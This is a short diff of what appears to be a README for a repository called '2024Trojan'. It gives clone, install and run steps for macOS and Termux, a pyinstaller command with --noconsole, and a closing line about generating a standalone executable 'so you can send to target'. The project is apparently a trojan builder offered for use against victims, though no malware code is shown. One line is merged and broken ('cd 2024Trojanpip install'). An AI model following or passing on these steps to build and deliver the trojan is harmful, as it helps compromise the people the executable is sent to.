@@ -36,11 +36,19 @@ pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 -
 
 
 macOS
+
+
+
 Open the Terminal.
+
 Clone this repository
+
 git clone https://github.com/BlackNode-stack/2024Trojan.git
+
 cd 2024Trojan
+
 python3 -m pip install -r requirements.txt
+
 python3 Run.py
 
 
@@ -50,12 +58,19 @@ pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 -
 
 
 Termux (Android)
+
 Install Termux from F-Droid or the Google Play Store.
+
 Update packages
+
 pkg update && pkg upgrade
+
 pkg install git python
+
 git clone https://github.com/BlackNode-stack/2024Trojan.git
+
 cd 2024Trojanpip install -r requirements.txt
+
 python Run.py
 
 Generate a standalone executable so you can send to target .
